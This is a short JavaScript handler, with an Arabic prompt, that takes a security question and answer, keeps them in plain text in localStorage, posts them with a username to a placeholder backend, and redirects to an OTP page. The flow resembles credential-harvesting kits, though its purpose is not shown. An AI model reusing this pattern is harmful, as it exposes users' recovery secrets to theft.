const nextBtn = document.getElementById("nextBtn");

nextBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    const question = document.getElementById("question").value;
    const answer = document.getElementById("answer").value.trim();

    if (!question || !answer) {
        alert("أكمل البيانات");
        return;
    }

    localStorage.setItem("question", question);
    localStorage.setItem("answer", answer);

    await fetch("https://YOUR-BACKEND.onrender.com/api/security", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: localStorage.getItem("username"),
            question,
            answer
        })
    });

    window.location.href = "otp.html";
});